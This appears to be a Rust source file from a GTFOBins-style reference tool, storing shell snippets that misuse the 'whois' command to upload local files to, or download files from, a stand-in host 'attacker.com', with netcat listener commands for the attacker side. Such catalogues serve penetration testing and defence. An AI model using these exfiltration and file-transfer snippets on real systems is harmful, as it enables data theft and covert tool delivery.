pub static BIN_NAME: &'static str = "whois";
pub static BIN_DESC: &'static str =
    "`whois` hangs waiting for the remote peer to close the socket.";
pub static FU_DESC_1: &'static str = r#"Send a text file to a TCP port. Run `nc -l -p 12345 > 'file_to_save'` on the attacker box to collect the file. The file has a trailing `$'\x0d\x0a'` and its length is limited by the maximum size of arguments."#;
pub static FU_CODE_1: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_to_send
    whois -h $RHOST -p $RPORT "`cat $LFILE`"
"#;
pub static FU_DESC_2: &'static str = r#"Send a binary file to a TCP port. Run `nc -l -p 12345 | tr -d $'\x0d' | base64 -d > 'file_to_save'` on the attacker box to collect the file. The file length is limited by the maximum size of arguments."#;
pub static FU_CODE_2: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_to_send
    whois -h $RHOST -p $RPORT "`base64 $LFILE`"
"#;
pub static FD_DESC_1: &'static str = r#"Fetch remote text file from a remote TCP port. Run `nc -l -p 12345 < 'file_to_send'` on the attacker box to send the file. The file has instances of `$'\x0d'` stripped."#;
pub static FD_CODE_1: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_to_save
    whois -h $RHOST -p $RPORT > "$LFILE"
"#;
pub static FD_DESC_2: &'static str = "Fetch remote binary file from a remote TCP port. Run `base64 'file_to_send' | nc -l -p 12345` on the attacker box to send the file.";
pub static FD_CODE_2: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_to_save
    whois -h $RHOST -p $RPORT | base64 -d > "$LFILE"
"#;
use crate::code::{Code, Tag};
pub static FU_1: Code<'static> = Code {
    title: "FU_CODE_1",
    code: FU_CODE_1,
    tag: Tag::FU,
};
pub static FU_2: Code<'static> = Code {
    title: "FU_CODE_2",
    code: FU_CODE_2,
    tag: Tag::FU,
};
pub static FD_1: Code<'static> = Code {
    title: "FD_CODE_1",
    code: FD_CODE_1,
    tag: Tag::FD,
};
pub static FD_2: Code<'static> = Code {
    title: "FD_CODE_2",
    code: FD_CODE_2,
    tag: Tag::FD,
};
